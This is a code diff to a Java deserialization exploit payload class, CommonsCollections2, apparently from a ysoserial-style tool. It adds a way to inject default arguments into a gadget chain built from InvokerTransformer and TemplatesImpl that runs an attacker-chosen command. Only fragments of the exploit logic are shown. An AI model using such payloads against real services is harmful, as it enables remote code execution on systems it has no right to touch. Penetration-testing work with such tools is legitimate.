@@ -24,6 +24,8 @@ import org.apache.commons.collections4.functors.InvokerTransformer;
  */
 public class CommonsCollections2 implements Payload {
 
+	private String[] args;
+
 	/**
 	 *
 	 * @param args
@@ -35,6 +37,8 @@ public class CommonsCollections2 implements Payload {
 	 */
 	@Override
 	public Object getPayload(String[] args) throws Exception {
+		if (this.args != null)
+			args = this.args;
 		final Object templates = Gadgets.createTemplatesImpl(args[0]);
 		// mock method name until armed
 		final InvokerTransformer transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
@@ -55,4 +59,10 @@ public class CommonsCollections2 implements Payload {
 
 		return queue;
 	}
+
+	@Override
+	public void injectDefaultArgs(String[] args) {
+		this.args = args;
+	}
+
 }
